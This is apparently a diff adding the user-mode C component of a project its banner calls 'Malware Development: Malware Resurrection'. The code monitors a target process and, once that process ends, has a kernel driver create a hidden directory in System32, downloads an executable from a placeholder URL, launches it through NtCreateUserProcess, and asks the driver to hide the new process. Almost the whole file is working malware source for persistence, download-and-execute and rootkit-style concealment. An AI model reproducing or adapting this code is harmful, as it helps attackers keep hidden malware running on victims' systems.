@@ -1,0 +1,243 @@
+﻿/*
+╔═════════════════════════════════════════════════════════════╗
+║                                                             ║
+║                 ⚠️  Malware Development  ⚠️                ║
+║                                                             ║
+║  @author: bekoo                                             ║
+║  @website : 0xbekoo.github.io                               ║
+║  @warning : This project has been developed                 ║
+║             for educational purposes only.Its use in        ║
+║             real scenarios is at one's own risk.            ║
+║                                                             ║
+║  @project: Malware Resurrection - UserMode Program          ║
+║                                                             ║
+╚═════════════════════════════════════════════════════════════╝
+*/
+
+#include "main.h"
+
+NTSTATUS CreateTargetProcess(UNICODE_STRING ImagePath, PHANDLE HandlePtr) {
+    PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
+    PPS_ATTRIBUTE_LIST AttrList;
+    PS_CREATE_INFO CreateInfo = { 0 };
+    HANDLE HandleProcess = NULL;
+    HANDLE HandleThread = NULL;
+    NTSTATUS Status;
+
+    Status = RtlCreateProcessParametersEx(&ProcessParameters, &ImagePath, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, \
+        RTL_USER_PROCESS_PARAMETERS_NORMALIZED);
+    if (!NT_SUCCESS(Status)) {
+        return Status;
+    }
+    CreateInfo.Size = sizeof(CreateInfo);
+    CreateInfo.State = PsCreateInitialState;
+
+    AttrList = (PS_ATTRIBUTE_LIST*)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE));
+    AttrList->TotalLength = sizeof(PS_ATTRIBUTE_LIST) - sizeof(PS_ATTRIBUTE);
+    AttrList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
+    AttrList->Attributes[0].Size = ImagePath.Length;
+    AttrList->Attributes[0].Value = (ULONG_PTR)ImagePath.Buffer;
+
+    Status = NtCreateUserProcess(&HandleProcess, &HandleThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, ProcessParameters, \
+        &CreateInfo, AttrList);
+    if (!NT_SUCCESS(Status)) {
+        RtlFreeHeap(RtlProcessHeap(), 0, AttrList);
+        RtlDestroyProcessParameters(ProcessParameters);
+        return Status;
+    }
+    *HandlePtr = HandleProcess;
+
+    RtlFreeHeap(RtlProcessHeap(), 0, AttrList);
+    RtlDestroyProcessParameters(ProcessParameters);
+    return STATUS_SUCCESS;
+}
+
+BOOLEAN ConnectDriver(DWORD DwIoControlCode, LPVOID InBuffer, DWORD  InBufferSize, LPVOID* OutBuffer, DWORD  OutBufferSize) {
+    HANDLE HandleDevice = NULL;
+    DWORD BytesReturned = 0;
+    BOOL Result;
+    
+    HandleDevice = CreateFile(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_HIDDEN, NULL);
+    if (NULL == HandleDevice) {
+        return FALSE;
+    }
+
+    Result = DeviceIoControl(HandleDevice, DwIoControlCode, InBuffer, InBufferSize, OutBuffer, OutBufferSize, &BytesReturned, NULL);
+    if (!Result) {
+        CloseHandle(HandleDevice);
+        return FALSE;
+    }
+
+    CloseHandle(HandleDevice);
+    return TRUE;
+}
+
+BOOLEAN DownloadExecutable(const CHAR* url, const CHAR* filePath) {
+    HINTERNET hInternet = NULL, hUrl = NULL;
+    HANDLE hFile = INVALID_HANDLE_VALUE;
+    BYTE buffer[4096];
+    DWORD bytesRead = 0, bytesWritten = 0;
+    BOOLEAN result = FALSE;
+
+    hInternet = InternetOpenA("WinINet Example", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (hInternet == NULL) {
+        printf("Failed to open internet session. Error: %lu\n", GetLastError());
+        return FALSE;
+    }
+
+    hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
+    if (hUrl == NULL) {
+        printf("Failed to open URL. Error: %lu\n", GetLastError());
+        InternetCloseHandle(hInternet);
+        return FALSE;
+    }
+
+    hFile = CreateFileA(filePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        printf("[-] Failed to create file. Error: %lu\n", GetLastError());
+        InternetCloseHandle(hUrl);
+        InternetCloseHandle(hInternet);
+        return FALSE;
+    }
+
+    while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
+        if (!WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL)) {
+            printf("Failed to write to file. Error: %lu\n", GetLastError());
+            CloseHandle(hFile);
+            InternetCloseHandle(hUrl);
+            InternetCloseHandle(hInternet);
+            return FALSE;
+        }
+    }
+    result = TRUE;
+
+    CloseHandle(hFile);
+    InternetCloseHandle(hUrl);
+    InternetCloseHandle(hInternet);
+
+    return result;
+}
+
+BOOLEAN IsProcessRunning(DWORD ProcessID) {
+    HANDLE HandleProcessSnap = NULL;
+    PROCESSENTRY32 PE32;
+    BOOL Status = FALSE;
+
+    HandleProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (INVALID_HANDLE_VALUE == HandleProcessSnap) {
+        return FALSE;
+    }
+
+    PE32.dwSize = sizeof(PROCESSENTRY32);
+    if (!Process32First(HandleProcessSnap, &PE32)) {
+        CloseHandle(HandleProcessSnap);
+        return FALSE;
+    }
+
+    do {
+        if (PE32.th32ProcessID == ProcessID) {
+            Status = TRUE;
+            break;
+        }
+    } while (Process32Next(HandleProcessSnap, &PE32));
+
+    CloseHandle(HandleProcessSnap);
+    return Status;
+}
+
+BOOLEAN MonitorProcess(DWORD ProcessID) {
+    BOOL IsRunning = IsProcessRunning(ProcessID);
+    int CheckInvertal = 5000;
+
+    printf("[*] Listening Process... (PID: %lu)\n", ProcessID);
+
+    while (IsRunning) {
+        Sleep(CheckInvertal);
+        IsRunning = IsProcessRunning(ProcessID);
+        if (!IsRunning) {
+            printf("[-] Process Terminated!\n");
+            break;
+        }
+    }
+    return IsRunning;
+}
+
+int main(int argc, char* argv[]) {
+    if (argc < 2) {
+        printf("Usage: .\\program.exe <PID>\n");
+        return -1;
+    }
+    /* Be careful not to put \\ at the end of the path. (ExecutablePath) */
+    CHAR ExecutablePath[0x80] = "C:\\Windows\\System32\HiddenFile";
+    CHAR ExecutableName[0x80] = "malwarename.exe";
+    CHAR ExecutableUrl[0x80] = "https://url";
+
+    DWORD CurrentPID = atoi(argv[1]);
+    ULONG_PTR d_PID = (ULONG_PTR)strtoul(argv[1], NULL, 10);
+    CHAR PathForUnicode[0x80];
+    HANDLE HandleNewProcess = NULL;
+    HANDLE ProcessID = NULL;
+    DWORD Error;
+    BOOL Result;
+    UNICODE_STRING ImagePath;
+    WCHAR UnicodeExecutablePath[256];
+    NTSTATUS Status;
+
+    Result = MonitorProcess(CurrentPID);
+    if (!Result) {
+        Result = ConnectDriver(IOCTL_CREATE_DIRECTORY, NULL, 0, NULL, 0);
+        if (!Result) {
+            Error = GetLastError();
+            if (Error != ERROR_ALREADY_EXISTS) {
+                printf("Failed to Create Directory! Error Code: 0x%lx\n", Error);
+                return -1;
+            }
+        }
+        printf("[*] Directory Path: %s\n", ExecutablePath);
+
+        int result = snprintf(ExecutablePath, sizeof(ExecutablePath), "%s\\%s", ExecutablePath, ExecutableName);
+        if (result < 0 || result >= sizeof(ExecutablePath)) {
+            printf("Failed to construct full path!\n");
+            return -1;
+        }
+        printf("[*] Malware Path: %s\n", ExecutablePath);
+
+        Result = DownloadExecutable(ExecutableUrl, ExecutablePath);
+        if (!Result) {
+            Error = GetLastError();
+            if (Error != ERROR_ALREADY_EXISTS) {
+                printf("[-] Failed to Download Executable! Error Code: 0x%lx\n", GetLastError());
+                return -1;
+            }
+            printf("[*] The executable is already downloaded.\n");
+        }
+        else {
+            printf("[+] The Executable Downloaded!\n");
+        }
+
+        /* Converting Executable Path to UNICODE_STRING with '\\??\\' */
+        snprintf(PathForUnicode, sizeof(PathForUnicode), "\\??\\%s", ExecutablePath);
+
+        MultiByteToWideChar(CP_ACP, 0, PathForUnicode, -1, UnicodeExecutablePath, 256);
+        RtlInitUnicodeString(&ImagePath, UnicodeExecutablePath);
+
+        Status = CreateTargetProcess(ImagePath, &HandleNewProcess);
+        if (!NT_SUCCESS(Status)) {
+            printf("[-] Failed to Create Process! NTSTATUS Code: 0x%08X\n", Status);
+            return -1;
+        }
+        ProcessID = (HANDLE)(ULONG_PTR)GetProcessId(HandleNewProcess);
+        printf("[*] Created Process! Process ID: %lu\n", (ULONG)(ULONG_PTR)ProcessID);
+
+        Result = ConnectDriver(IOCTL_HIDE_PROCESS, &ProcessID, sizeof(ULONG_PTR), NULL, 0);
+        if (!Result) {
+            printf("[-] Failed to Hide The Process! Error Code: 0x%lx\n", GetLastError());
+            CloseHandle(HandleNewProcess);
+            return -1;
+        }
+        printf("[+] The Process has been Hidden!\n");
+    }
+    CloseHandle(HandleNewProcess);
+
+    return 0;
+}
